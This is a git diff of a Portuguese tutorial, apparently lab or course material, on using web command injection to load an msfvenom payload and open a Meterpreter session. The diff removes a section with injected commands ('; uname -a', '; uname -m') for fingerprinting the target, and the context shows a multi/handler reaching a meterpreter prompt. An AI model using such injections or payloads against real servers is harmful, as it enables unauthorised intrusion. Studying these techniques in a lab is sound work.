@@ -1,20 +1,7 @@
 # Command Injection com Meterpreter
 
 **Objetivo:** repetir o exercício de invasão web com command injection, porém carregando um payload na máquina alvo para nos permitir acesso a um meterpreter.
-
-## Conhecendo mais sobre o servidor web
-
-Utilizando o injeção de comandos, podemos saber um pouco mais sobre o servidor que hospeda a página sendo atacada.
-
-* Para conhecer o sistema operacional: `; uname -a`
-  !Comando
-  !Resposta
-  O servidor usa o Linux
-* Para conhecer a arquitetura: `; uname -m`
-  !Comando
-  !Resposta
-  Com uma arquitetura de 32 bits
-  
+ 
 ## Criação do payload
 
 Criaremos o payload através do aplicativo msfvenom do metasploit.
@@ -135,4 +122,3 @@ msf exploit(multi/handler) > run
 meterpreter >
 ```
 Abertura do meterpreter com acesso a máquina alvo.
-
